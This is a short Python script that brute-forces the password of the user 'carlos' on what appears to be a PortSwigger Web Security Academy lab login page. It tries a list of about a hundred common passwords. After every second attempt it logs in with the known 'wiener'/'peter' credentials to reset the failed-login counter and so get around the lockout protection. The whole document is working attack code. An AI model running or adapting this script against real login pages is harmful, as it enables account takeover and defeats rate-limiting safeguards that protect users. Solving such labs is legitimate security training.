import requests

login_page = 'https://0a91004704f43adb81d15792008700a4.web-security-academy.net/login'

def try_login(username, password):
    data = {'username': username, 'password': password}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(login_page, headers=headers, data=data)
    return response

passwords_to_try = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",
    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein",
    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn",
    "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love",
    "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow"
]

for i, pwd in enumerate(passwords_to_try):
    print(f'Trying password for carlos: {pwd}')
    response = try_login('carlos', pwd)

    if 'Your username is: carlos' in response.text:
        print(f'Found password for carlos: {pwd}')
        break

    if (i + 1) % 2 == 0:
        print('Resetting failed login counter with wiener account...')
        try_login('wiener', 'peter')

print('Script completed.')
